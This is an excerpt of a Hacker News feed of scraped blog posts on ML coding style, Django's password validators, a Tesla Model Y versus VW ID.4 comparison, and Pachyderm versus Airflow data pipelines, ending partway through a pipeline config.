  <p>Now you can tell from the name of the function weather it throws an exception or not. For people reading the code it makes it easier to understand the error behavior of the code.</p>
  <p>
    <strong>7. Avoid boilerplate (40:52)</strong>. Avoid repeating the same code, or almost the same code, in multiple places. Boilerplate appears, in general, because people have a cut and paste template they use to do almost the same thing in multiple spots and because their language isn't good enough to encode what they want to do in a clean way. You want to get rid of boilerplate because the structure you're repeating is there for a reason, and your code evolves. At that point you're not going to remember all the places where the repetition shows up. It also goes back to readability. It's hard to convince people to read code if it's dull. And nothing is duller than boilerplate, even though the code is critical.
  </p>
  <p>Interestingly, reducing boilerplate doesn't always make code less verbose. The goal isn't to make the code shorter but to separate out which parts of the code is the same and which parts vary.</p>
  <p>
    <strong>8. Avoid complex type hackery (45:30)</strong>. The enemy of good code, of correctness, isn't dynamic guarantees, properties about the code that cannot be proved at compile time, but complexity. Refrain from making your code more complex (using <a href="http://mlton.org/PhantomType">phantom types</a>, for instance), just so you can have the type system verify additional properties of the code.
  </p>
  <p>
    <strong>9. Don't be puritanical about purity (47:10)</strong>. Avoiding side-effect is generally worth striving for, because code without side-effects tends to be easier to reason about. But sometimes it's also just easier to code with side-effects. There may even be performance reasons for allowing side-effects so don't be embarrassed about it. In reality, programs don't just compute things, they do things like write files, send messages, and so on. All this doing involves side-effects. Again, remember that the enemy of correctness is complexity. Don't jump through hoops to make your code too complex just to make it pure.
  </p>
</div></div>]]>
            </description>
            <link>http://bugfree.dk/blog/2012/06/24/effective-ml-and-fsharp</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529774</guid>
            <pubDate>Sat, 19 Sep 2020 19:17:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How does Django validate passwords?]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24529740">thread link</a>) | @rangerranvir
<br/>
September 19, 2020 | https://ranvir.xyz/blog/how-does-django-validate-passwords/ | <a href="https://web.archive.org/web/*/https://ranvir.xyz/blog/how-does-django-validate-passwords/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p><img data-src="https://i.ibb.co/n3YzYyF/Main-Images-4-1.png" alt="How does Django validate passwords" title="How does Django validate passwords" src="https://i.ibb.co/n3YzYyF/Main-Images-4-1.png">
</p><p>
A few days ago, I was working on one of my old Django projects. It was running an old version of Django and I wanted to keep it updated with the latest changes of the framework.</p>
<p>
So to check the <a href="https://ranvir.xyz/blog/django-admin-tips-and-tricks/">admin site</a>, I tried to create the superuser after connection to the local database.</p>
<div><div><pre><code><span>python</span> <span>manage</span><span>.</span><span>py</span> <span>createsuperuser</span>
</code></pre></div></div>

<p>
When I passed a password similar to the username it failed saying, <code>The password is too similar to the username.</code></p>
<p><img data-src="https://i.ibb.co/94D2x9G/Screenshot-2020-09-19-at-1-32-17-AM.png" alt="The password is too similar to the username" title="The password is too similar to the username" src="https://i.ibb.co/94D2x9G/Screenshot-2020-09-19-at-1-32-17-AM.png">
</p><p>
This error triggered me to check the working behind this password validation feature.</p><p>
The first thing that I looked into was the <code>manage.py</code> file itself which in turn was importing and executing a method called, <code>execute_from_command_line</code>.</p><p>
I traced it back and found a package <code>commands</code> containing everything that I wanted to know. This directory had two files.</p>
<div><div><pre><code><span>1.</span> <span>createsuperuser</span><span>.</span><span>py</span>
<span>2.</span> <span>changepassword</span><span>.</span><span>py</span>
</code></pre></div></div>
<h2 id="the-changepassword-command">The changepassword command</h2><p>
Since I had never used/ heard about the <code>changepassword</code> command, I thought of trying it first and to my great pleasure, it worked. You have to pass the username as the first argument.</p>
<div><div><pre><code><span>python</span> <span>manage</span><span>.</span><span>py</span> <span>changepassword</span> <span>username</span>
</code></pre></div></div>
<p><img data-src="https://i.ibb.co/YRfMkYW/Screenshot-2020-09-19-at-3-10-09-AM.png" alt="python manage.py changepassword" title="python manage.py changepassword" src="https://i.ibb.co/YRfMkYW/Screenshot-2020-09-19-at-3-10-09-AM.png">
</p><p>
Sometimes you find gold when you read the code, right? ðŸ˜�</p><p>
Now letâ€™s get back to the business and look into the <code>createsuperuser</code> command class in more detail.</p>
<h2 id="fetching-the-correct-database">Fetching the correct database</h2><p>
If you have been using Django for some time, you would know that Django allows you to change a lot of things depending upon the settings you define.</p><p>
This also includes using some random model as your base User model. This is the first thing that the superuser creation <code>__init__</code> constructor method checks for.</p>
<h2 id="creating-the-superuser-without-interaction">Creating the superuser without interaction</h2><p>
You can use a version of the command that allows you to create the superuser without any interaction.</p>
<div><div><pre><code><span>python</span> <span>manage</span><span>.</span><span>py</span> <span>createsuperuser</span> <span>--</span><span>username</span> <span>ranvir</span> <span>--</span><span>email</span> <span>abc</span><span>@</span><span>abc</span><span>.</span><span>com</span> <span>--</span><span>no</span><span>-</span><span>input</span>
</code></pre></div></div>
<p><img data-src="https://i.ibb.co/LJtHHq5/Screenshot-2020-09-19-at-3-17-49-AM.png" alt="python manage.py createsuperuser no-input" title="python manage.py createsuperuser no-input" src="https://i.ibb.co/LJtHHq5/Screenshot-2020-09-19-at-3-17-49-AM.png">
</p><p>
Although the user created using this process will have no password. We can create the password either using the <code>changepassword</code> command or the admin panel.</p>
<h2 id="required-fields-and-interactive-mode">Required fields and interactive mode</h2><p>
For the default <code>User</code> model, <code>email</code> is the only required field but you can change that by changing your <code>REQUIRED_FIELD</code> setting as well.</p><p>
In the interactive mode( which is the default mode as well), the first thing that the prompt asks you to fill, is the username.</p><p>

Django tries to smartly suggest the current system username as the default username. (Just Wow)</p>
<p><img data-src="https://i.ibb.co/pr1Z1Qw/Screenshot-2020-09-19-at-2-14-46-AM.png" alt="django suggest the current system username" title="django suggest the current system username" src="https://i.ibb.co/pr1Z1Qw/Screenshot-2020-09-19-at-2-14-46-AM.png">
</p><p>
It wonâ€™t suggest the system username if it is already taken. (Thatâ€™s AI for me ðŸ˜‚)</p>
<p><img data-src="https://i.ibb.co/r3YxbKL/Screenshot-2020-09-19-at-2-15-41-AM.png" alt="django doens't suggest the current system username if already taken" title="django doens't suggest the current system username if already taken" src="https://i.ibb.co/r3YxbKL/Screenshot-2020-09-19-at-2-15-41-AM.png">
</p><p>
After the username, you have to fill in the required field which is the email field for the default User model.</p><p>
Finally, you have to fill in the password field.</p>
<h2 id="the-validate-password-method">The validate password method</h2><p>
Sorry for keeping you waiting this long before jumping onto the real reason behind the post.</p><p>
The <code>validatepassword</code> is the function that is used to validate the password provided by the user.</p><p>
Again, we can configure all these validators as well, if these different password validation doesnâ€™t work for you, go forward and remove the classes from your settings file.</p><p>
These are the default validators.</p>
<div><div><pre><code><span>AUTH_PASSWORD_VALIDATORS</span> <span>=</span> <span>[</span>
    <span>{</span>
        <span>'NAME'</span><span>:</span> <span>'django.contrib.auth.password_validation.UserAttributeSimilarityValidator'</span><span>,</span>
    <span>},</span>
    <span>{</span>
        <span>'NAME'</span><span>:</span> <span>'django.contrib.auth.password_validation.MinimumLengthValidator'</span><span>,</span>
    <span>},</span>
    <span>{</span>
        <span>'NAME'</span><span>:</span> <span>'django.contrib.auth.password_validation.CommonPasswordValidator'</span><span>,</span>
    <span>},</span>
    <span>{</span>
        <span>'NAME'</span><span>:</span> <span>'django.contrib.auth.password_validation.NumericPasswordValidator'</span><span>,</span>
    <span>},</span>
<span>]</span>
</code></pre></div></div><p>
If we use the default validators, then the password,</p>
<ol>
<li>Should not be similar to <code>username</code>, <code>first_name</code>, <code>last_name</code> and <code>email</code>. It also checks for the similarity using <a href="https://docs.python.org/2.4/lib/sequence-matcher.html">SequenceMatcher</a>. It should be less than 0.7 similar which you can customize. (Told you, itâ€™s AI)</li>
<li>Should be greater than 8 characters.</li>
<li>Should not be in the list of common passwords. The list of common passwords is in the file, <code>common-passwords.txt.gz</code>. It contains a list of around 20000 common passwords which you should not use.</li>
<li>Should not contain all numeric characters.</li>
</ol><p>
I would suggest keeping the basic configuration intact for the password handling. You can use your own validations on top of it as well.</p><p>
So, thatâ€™s it for this time. Till next time.</p>
</div></div>]]>
            </description>
            <link>https://ranvir.xyz/blog/how-does-django-validate-passwords/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529740</guid>
            <pubDate>Sat, 19 Sep 2020 19:11:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tesla Model Y vs. VW ID.4 comparison (ext dimensions, range, specs)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24529692">thread link</a>) | @iqtidar
<br/>
September 19, 2020 | https://www.teslaoracle.com/2020/09/19/volkswagen-compares-id4-tesla-model-y/ | <a href="https://web.archive.org/web/*/https://www.teslaoracle.com/2020/09/19/volkswagen-compares-id4-tesla-model-y/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
			<figure>
            <figcaption data-amp-original-style="border:1px dotted blue; margin:2px 0; text-align:center;">Advertisement</figcaption>
            <amp-ad width="100vw" height="320" type="adsense" data-ad-client="ca-pub-0923072950810999" data-ad-slot="4076643206" data-auto-format="rspv" data-full-width="" i-amphtml-layout="fixed">
              
            </amp-ad>
            </figure>
				<!-- .Adsense Ad -->

		
<p>In a recently leaked internal drawing from Volkswagen AG, the German automaker is seen comparing its upcoming ID.4 compact electric SUV to the Tesla Model Y.</p>



<p>Translating a word on the drawing revealed that this is a hand-drawn sketch of both cars probably by a Volkswagen car designer. The sketch mostly outlines the comparison of the exterior dimensions between both EVs.</p>



<figure data-amp-lightbox="true"><amp-img src="https://www.teslaoracle.com/wp-content/uploads/2020/09/Tesla-Model-Y-VW-ID4-Comparison-1-1024x517.jpg" alt="Exterior, interior dimensions, and vital specs  of the VW ID.4 and Tesla Model Y compared by Volkswagen (illustration and numbers)." srcset="https://www.teslaoracle.com/wp-content/uploads/2020/09/Tesla-Model-Y-VW-ID4-Comparison-1-1024x517.jpg 1024w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Tesla-Model-Y-VW-ID4-Comparison-1-300x151.jpg 300w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Tesla-Model-Y-VW-ID4-Comparison-1-768x388.jpg 768w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Tesla-Model-Y-VW-ID4-Comparison-1-1536x775.jpg 1536w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Tesla-Model-Y-VW-ID4-Comparison-1-1200x606.jpg 1200w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Tesla-Model-Y-VW-ID4-Comparison-1.jpg 1817w" sizes="(max-width: 1024px) 100vw, 1024px" width="1024" height="517" data-amp-lightbox="" lightbox="" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img src="https://www.teslaoracle.com/wp-content/uploads/2020/09/Tesla-Model-Y-VW-ID4-Comparison-1-1024x517.jpg" alt="Exterior, interior dimensions, and vital specs  of the VW ID.4 and Tesla Model Y compared by Volkswagen (illustration and numbers)." srcset="https://www.teslaoracle.com/wp-content/uploads/2020/09/Tesla-Model-Y-VW-ID4-Comparison-1-1024x517.jpg 1024w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Tesla-Model-Y-VW-ID4-Comparison-1-300x151.jpg 300w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Tesla-Model-Y-VW-ID4-Comparison-1-768x388.jpg 768w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Tesla-Model-Y-VW-ID4-Comparison-1-1536x775.jpg 1536w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Tesla-Model-Y-VW-ID4-Comparison-1-1200x606.jpg 1200w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Tesla-Model-Y-VW-ID4-Comparison-1.jpg 1817w" sizes="(max-width: 1024px) 100vw, 1024px" width="1024" height="517" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzUxNycgd2lkdGg9JzEwMjQnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img><figcaption>Exterior, interior dimensions, and vital specs of the VW ID.4 and Tesla Model Y compared by Volkswagen (illustration and numbers). Credits: <a href="https://www.reddit.com/r/electricvehicles/comments/it61y9/vw_group_directly_comperes_the_id4_with_tesla/" target="_blank" rel="noreferrer noopener nofollow">u/fxkingrich</a> via r/electricvehicles.</figcaption></figure>



<p>For the ease of understanding the comparison, I took the numbers mentioned on the above sketch sheet and put it in the following table. I also converted millimeters to inches for readers acquainted with the imperial unit system.</p>



<h2>Table: Tesla Model Y vs. VW ID.4 Dimensions and Specs Comparison</h2>



<figure><table><tbody><tr><th scope="col">&nbsp;</th><th scope="col">VW ID.4</th><th scope="col">Tesla Model Y</th><th scope="col">Difference</th></tr><tr><th scope="row">Length</th><td>4,584 mm (180.4 in)</td><td>4,751 mm (187 in)</td><td>-167 mm (-6.6 in)</td></tr><tr><th scope="row">Wheelbase</th><td>2,766 mm (109 in)</td><td>2,875 mm (113 in)</td><td>-109 mm (-4 in)</td></tr><tr><th scope="row">Turning Circle</th><td>10.2 m</td><td>12.1 m</td><td>+1.9 m</td></tr><tr><th scope="row">Battery Pack</th><td>78 kWh</td><td>78.3 kWh</td><td>Similar</td></tr><tr><th scope="row">Range (WLTP)</th><td>522 km</td><td>~505 km</td><td>Almost similar</td></tr><tr><th scope="row">Peak Charging Rate</th><td>125 kW</td><td>250 kW</td><td>-125 kW (50% slower)</td></tr><tr><th scope="row">Acceleration (0-100 km/h)</th><td>8.5s</td><td>5.1s</td><td>-3.4s</td></tr><tr><th scope="row">Price (Euros)</th><td>44,500 (RWD)<br>49,000 (AWD)</td><td>&nbsp;~54,000 (RWD)*<br>58,620 (AWD)</td><td>-10,000<br>-9,000</td></tr></tbody></table><figcaption>*It’s Volkswagen’s estimated price for the RWD variant of the Tesla Model Y which is still not in production. Data Source: Manufacturer Specs.</figcaption></figure>



<div><figure><a href="https://evannex.com/pages/tesla-model-y-accessories/?ref=Iqtidar_TeslaOracle_ModelY_Banner" target="_blank" rel="sponsored noopener noreferrer"><amp-img src="https://www.teslaoracle.com/wp-content/uploads/2020/06/Tesla-Model-Y-Accessories_small.jpg" alt="" width="508" height="360" layout="intrinsic" i-amphtml-layout="intrinsic"><img src="https://www.teslaoracle.com/wp-content/uploads/2020/06/Tesla-Model-Y-Accessories_small.jpg" alt="" width="508" height="360" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzM2MCcgd2lkdGg9JzUwOCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img></a><figcaption>– Sponsored –</figcaption></figure></div>



<h3>Price Comparison</h3>



<p>The most interesting bit from this comparison is the price point at which Volkswagen is able to offer a comparable range electric SUV against the <a href="https://www.teslaoracle.com/topic/model-y/">Tesla Model Y</a>. A difference of around €10k is a huge plus point for the VW ID.4 at the moment.</p>



<p>The price of the Model Y will certainly go down once <a href="https://www.teslaoracle.com/tag/giga-berlin/">Giga Berlin</a> is up and running with Model Y production next year. The plant will save the time and cost of shipping all the way from the United States and result in a possibly significant price decrease.</p>



<figure data-amp-lightbox="true" data-amp-noloading="false"><amp-img src="https://www.teslaoracle.com/wp-content/uploads/2020/09/Tesla-Model-Blue-Metallic-1024x576.jpg" alt="Tesla Model Y in Metallic Blue color (rear view)." srcset="https://www.teslaoracle.com/wp-content/uploads/2020/09/Tesla-Model-Blue-Metallic-1024x576.jpg 1024w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Tesla-Model-Blue-Metallic-300x169.jpg 300w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Tesla-Model-Blue-Metallic-768x432.jpg 768w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Tesla-Model-Blue-Metallic.jpg 1200w" sizes="(max-width: 1024px) 100vw, 1024px" width="1024" height="576" data-amp-lightbox="" lightbox="" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img src="https://www.teslaoracle.com/wp-content/uploads/2020/09/Tesla-Model-Blue-Metallic-1024x576.jpg" alt="Tesla Model Y in Metallic Blue color (rear view)." srcset="https://www.teslaoracle.com/wp-content/uploads/2020/09/Tesla-Model-Blue-Metallic-1024x576.jpg 1024w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Tesla-Model-Blue-Metallic-300x169.jpg 300w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Tesla-Model-Blue-Metallic-768x432.jpg 768w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Tesla-Model-Blue-Metallic.jpg 1200w" sizes="(max-width: 1024px) 100vw, 1024px" width="1024" height="576" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzU3Nicgd2lkdGg9JzEwMjQnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img><figcaption>Tesla Model Y in Metallic Blue color (rear view). Source: Tesla Inc. (TSLA)</figcaption></figure>



<h3>Charging &amp; Charging Infrastructure</h3>



<p>But VW ID.4’s peak charging rate or at the speed that it can be charged is lacking at least 1 generation behind the Tesla Model Y’s.</p>



<p>Tesla’s older V2 Superchargers are able to charge Teslas at 120 to 145 kW. With the latest V3 stations, Teslas are able to charge at 250 kW peak rate which translates to around <a href="https://www.xautoworld.com/tesla/model3-v3-supercharging-time/" target="_blank" rel="noreferrer noopener">1000 miles or 1600 kilometers of range added to the battery pack in 1 hour</a> of charging.</p>



<p>Tesla Model Y has another advantage as the automaker’s dedicated Supercharger Network is already abundant in Europe, North American, and the main Chinese cities. </p>



<p><a href="https://www.teslaoracle.com/tag/volkswagen/">Volkswagen</a>, besides partnering with 3rd-party EV charging providers will have to build its own infrastructure as well to compete with Tesla — because electric car drivers need peace of mind when they need electrons for the battery.</p>



<figure data-amp-lightbox="true"><amp-img src="https://www.teslaoracle.com/wp-content/uploads/2020/09/VW-ID4-Green-Mobility-Initiative.jpg" alt="Heading for emission-free mobility - the ID.4 (infographic)." width="700" height="393" srcset="https://www.teslaoracle.com/wp-content/uploads/2020/09/VW-ID4-Green-Mobility-Initiative.jpg 1024w, https://www.teslaoracle.com/wp-content/uploads/2020/09/VW-ID4-Green-Mobility-Initiative-300x169.jpg 300w, https://www.teslaoracle.com/wp-content/uploads/2020/09/VW-ID4-Green-Mobility-Initiative-768x432.jpg 768w" sizes="(max-width: 700px) 100vw, 700px" data-amp-lightbox="" lightbox="" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img src="https://www.teslaoracle.com/wp-content/uploads/2020/09/VW-ID4-Green-Mobility-Initiative.jpg" alt="Heading for emission-free mobility - the ID.4 (infographic)." width="700" height="393" srcset="https://www.teslaoracle.com/wp-content/uploads/2020/09/VW-ID4-Green-Mobility-Initiative.jpg 1024w, https://www.teslaoracle.com/wp-content/uploads/2020/09/VW-ID4-Green-Mobility-Initiative-300x169.jpg 300w, https://www.teslaoracle.com/wp-content/uploads/2020/09/VW-ID4-Green-Mobility-Initiative-768x432.jpg 768w" sizes="(max-width: 700px) 100vw, 700px" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzM5Mycgd2lkdGg9JzcwMCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB2ZXJzaW9uPScxLjEnLz4="></amp-img><figcaption>Heading for emission-free mobility – the ID.4 (infographic). Credits: Volkswagen AG.</figcaption></figure>



<h3>Verdict</h3>



<p>The good news in all of this is VW is taking electric mobility seriously now and recently, <a href="https://www.teslaoracle.com/2020/09/08/elon-musk-test-drove-the-vw-id-3-germany/">Volkswagen Chairman Herbert Diess invited Elon Musk for a test drive on the company’s ID.3</a> hatchback EV.  Elon Musk said, “I think for a non-sporty car it’s pretty good”. </p>



<p>Looks like Tesla and Elon Musk are well prepared for this type of competition in the compact SUV / Crossover segment, therefore the Gigafactory Berlin is taking shape so fast. If Tesla is also able to source Model Y parts from local suppliers at competitive prices <a href="https://www.teslaoracle.com/2020/09/14/tesla-450k-heat-pumps-china-mdoel-3-model-y/">like China</a>, the Model Y price might be further reduced to give thought time to the VW ID.4.</p>



<p>Volkswagen’s electric mobility division is moving fast as last week they handed over ID.3 to its first owner and the ID.4 production as seen in the following picture has already started at the automaker’s Zwickau manufacturing plant. </p>



<figure data-amp-lightbox="true"><amp-img src="https://www.teslaoracle.com/wp-content/uploads/2020/09/VW-ID4-Zwickau-Plant-1024x576.jpg" alt="VW ID.4 electric SUV at the German automaker's Zwickau manufacturing facility." srcset="https://www.teslaoracle.com/wp-content/uploads/2020/09/VW-ID4-Zwickau-Plant-1024x576.jpg 1024w, https://www.teslaoracle.com/wp-content/uploads/2020/09/VW-ID4-Zwickau-Plant-300x169.jpg 300w, https://www.teslaoracle.com/wp-content/uploads/2020/09/VW-ID4-Zwickau-Plant-768x432.jpg 768w, https://www.teslaoracle.com/wp-content/uploads/2020/09/VW-ID4-Zwickau-Plant.jpg 1200w" sizes="(max-width: 1024px) 100vw, 1024px" width="1024" height="576" data-amp-lightbox="" lightbox="" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img src="https://www.teslaoracle.com/wp-content/uploads/2020/09/VW-ID4-Zwickau-Plant-1024x576.jpg" alt="VW ID.4 electric SUV at the German automaker's Zwickau manufacturing facility." srcset="https://www.teslaoracle.com/wp-content/uploads/2020/09/VW-ID4-Zwickau-Plant-1024x576.jpg 1024w, https://www.teslaoracle.com/wp-content/uploads/2020/09/VW-ID4-Zwickau-Plant-300x169.jpg 300w, https://www.teslaoracle.com/wp-content/uploads/2020/09/VW-ID4-Zwickau-Plant-768x432.jpg 768w, https://www.teslaoracle.com/wp-content/uploads/2020/09/VW-ID4-Zwickau-Plant.jpg 1200w" sizes="(max-width: 1024px) 100vw, 1024px" width="1024" height="576" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzU3Nicgd2lkdGg9JzEwMjQnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img><figcaption>VW ID.4 electric SUV at the German automaker’s Zwickau manufacturing facility. Credits: Volkswagen AG.</figcaption></figure>



<figure>
<amp-ad width="100vw" height="320" type="adsense" data-ad-client="ca-pub-0923072950810999" data-ad-slot="7514654329" data-auto-format="rspv" data-full-width="" i-amphtml-layout="fixed">
  
</amp-ad>
</figure>



<p>As Tesla is willing to ramp the Tesla Model Y production at the Gigafactory Berlin to 500,000 units/year in the coming years. Volkswagen is also aiming for the same number of ID.4 vehicles produced and sold till 2025.</p>



<blockquote><p>Volkswagen wants to become the world market leader in e-mobility – but that won’t happen by itself. The Volkswagen brand is therefore investing around 11 billion euros by 2024. As a compact SUV, the ID.4 has, in our view, the best prerequisites for being successful in a large scale in all important markets. We, therefore, expect the Volkswagen brand to produce a total of 1.5 million e-cars per year by 2025. And the ID.4 is likely to account for around a third of this. The ID.4 will thus become the driving force behind our reorientation a hundred thousand times over.</p><cite>Volkswagen CEO Ralf Brandstätter via a company <a href="https://www.volkswagen-newsroom.com/en/stories/the-id4-to-become-an-electrically-powered-world-car-6423" target="_blank" rel="noreferrer noopener">press-release</a>.</cite></blockquote>



<p>On the other end, Tesla CEO <a href="https://www.teslaoracle.com/2020/09/03/model-y-gigafactory-berlin-radical-technology-shif-elon-musk/">Elon Musk on his visit to Germany said that Model Y production at Giga Berlin</a> will mark a radical shift in how cars are made. Part of this is revealed that Tesla plans to install <a href="https://www.teslaoracle.com/2020/09/11/tesla-fremont-factory-drone-video-shows-the-model-y-gigacast-machines-roadrunner-magic-cube/">giant casting machines at the German Gigafactory</a> that will accelerate the production process manyfold.</p>



<p>The competition between these two automotive giants in the electric vehicle universe will be interesting to see in the near future.</p>



<p>Follow us on <a href="https://news.google.com/publications/CAAqBwgKMOarmgswgLayAw" target="_blank" rel="noreferrer noopener">Google News</a> | <a href="https://flipboard.com/@TeslaOracle" target="_blank" rel="noreferrer noopener nofollow">Flipboard</a> | <a href="https://feedly.com/i/subscription/feed%2Fhttps%3A%2F%2Fwww.teslaoracle.com%2Ffeed%2F" target="_blank" rel="noreferrer noopener nofollow">RSS (Feedly)</a> to stay tuned with the news and updates.</p>



<h4>Related:</h4>



		</div></div>]]>
            </description>
            <link>https://www.teslaoracle.com/2020/09/19/volkswagen-compares-id4-tesla-model-y/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24529692</guid>
            <pubDate>Sat, 19 Sep 2020 19:03:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pachyderm vs. Airflow]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24529683">thread link</a>) | @ishcheklein
<br/>
September 19, 2020 | https://szeitlin.github.io/posts/engineering/pachyderm-vs-airflow/ | <a href="https://web.archive.org/web/*/https://szeitlin.github.io/posts/engineering/pachyderm-vs-airflow/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        

<p>If you do a lot of data pipelining, you’ve probably heard a lot about Airflow by now. I gave a talk
about it a while back at a meetup, and wrote a blog post about it. The gist of my pitch for Airflow
was essentially <em>“Look, it’s so much better than cron.”</em></p>

<p>Fast-forward a year or two, and my team is using Pachyderm now. This post is about why I wanted to try Pachyderm,
what I love about it, some things that can be improved about it, and some of the tricks you’ll need to know if you want to start using it.</p>

<p><em>Note: I am not in any way being paid by Pachyderm.</em></p>

<hr>



<ul>
<li><p>Designed for a machine learning model workflow, but can also handle regular data pipelining
(including cron-style scheduling). This is incredibly reassuring to me, because Airflow is kind of the other way around.</p></li>

<li><p>Scalability (parallelization support). I haven’t done much with this yet, but it’s also reassuring to know it’s there,
since we’re a rapidly growing company, and I’m sure our data needs are going to continue to expand.</p></li>

<li><p>Data and code provenance tracking are built-in.</p></li>
</ul>

<p><em>What that means:</em> It’s easy to figure out what version
 of your code was running at any given time, and on what data. This is critical if you’re iterating on
 code for ETL processes or models, or tracking a model that’s going to evolve over time based on what data it has seen.</p>

<ul>
<li>The egress feature and built-in feed-forward are amazingly elegant.<br></li>
</ul>

<p>Feed-forward (I don’t know what they call it, that’s just what I call it) means
you can have one pipeline read from the output of another, and trigger off of that directly.</p>

<p>In Airflow, for comparison, you had to configure this with messaging and it was kind of clunky
(and originally there was no push, only pull, so you were always polling for <em>is that thing done yet?</em>).</p>

<p>In Pachyderm, it’s an extremely simple configuration.</p>

<p>Egress means you don’t have to write a plugin to do something as basic as push your data to s3. Pachyderm already
knows how to do that for you (see below for an example of how this is specified in a pipeline).</p>

<p>There’s also an easy way to tell it to re-process as much data as you want (*except for cron inputs, but they’re
going to fix that).</p>

<ul>
<li>Not having to clean up the fallout from runaway backfills</li>
</ul>

<p>Runaway backfill in Airflow made our server fall down more than once whenever anybody
forgot to update the start date or name of their DAG. This was a built-in default setting that we couldn’t change,
where Airflow would try to backfill any missing data to the beginning of time
(1970, of course), and celery would get overloaded.</p>

<p>We tried numerous approaches to make it impossible to do this
by accident, including having tests for checking that the start_date for a revised DAG
was always after the date of the latest changes.</p>

<p>It was the bane of my Airflow existence. Clearing the celery cache
and getting it to restart, and then backfill what we <em>actually</em> wanted was always a time-consuming process, including
kicking the web server again and getting everything back online.</p>

<ul>
<li>Smart re-tries by default (and this is configurable).</li>
</ul>

<p>Having retries at all was a big advantage of Airflow over basic cron, especially since it’s modular, so you can
have different re-try settings for each step of an ETL pipeline.</p>

<p>Having said that, this was a also kind of a pain to deal with in Airflow, because
if somebody set a ridiculous number of retries, or a backfill job was failing,
it could easily become a blocker for unrelated pipelines just by
gunking up the celery queue with tons of re-tries for something that was
 already failing (see above re: runaway backfill).</p>

<p>With Airflow, we were always having to guess about how many
retries to do, and how much back-off to add in between tries.</p>

<p>Pachyderm’s defaults for this are completely reasonable
(3 retries, with increasing delay in between each try).</p>

<p>If you get the enterprise version (which is cheap for an enterprise product):</p>

<ul>
<li><p>It’s more secure than Airflow, with built-in encryption (There’s also no risk of exposing
passwords by printing all the logs to a webpage that anyone can see, the way Airflow did by default.)</p></li>

<li><p>Really responsive and smart team, and a growing community of users</p></li>

<li><p>Nice dashboard to go with the CLI tool</p></li>

<li><p>Finally, if you don’t like writing DAGs in Airflow, and are considering one of the myriad (!) new tools
to simplify that for you, this is even simpler than that. (And in my opinion, makes a lot more sense.)</p></li>
</ul>

<p>And here’s an example of a full ETL process with 3 pipeline steps:</p>

<p><strong>1. Get the data from an api</strong></p>

<pre><code>{
    "pipeline": {
       "name": "api_to_s3_pipeline"
    },

    "transform": {
       "cmd": ["python3", "get_requests.py"],
       "image": "pathto.ecr.region.aws.com/mydockerregistry:my_api_image_v1",
       "image_pull_secrets": ["regcred"]
    },
    "input":{
        "cron": {
            "name": "api_daily_job",
            "spec": "16 6 * * *",
            "repo": "api_to_s3"
         }
    },
    "egress": {"URL": "s3://mys3bucket/"},
    "enable_stats": true,
    "job_timeout": 10m
}
</code></pre>

<p><strong>2. Process the data with pyspark on kubernetes</strong></p>

<pre><code>{
    "pipeline": {
       "name": "pyspark_pipeline"
    },

    "transform": {
       "cmd": ["python3", "pyspark_processsing.py"],
       "image": "pathto.ecr.region.aws.com/mydockerregistry:my_pyspark_image_v1",
       "image_pull_secrets": ["regcred"]
    },
    "input":{
        "atom": {
            "name": "pyspark_daily_job",
            "repo": "pyspark_daily_job",
            "glob: "/*/*/*/"
         }
    },
    "egress": {"URL": "s3://my-pyspark-bucket/"},
    "enable_stats": true,
    "job_timeout": 120m
}
</code></pre>

<p><strong>3. Load the data to Redshift</strong></p>

<pre><code>{
    "pipeline": {
       "name": "load_to_redshift_pipeline"
    },

    "transform": {
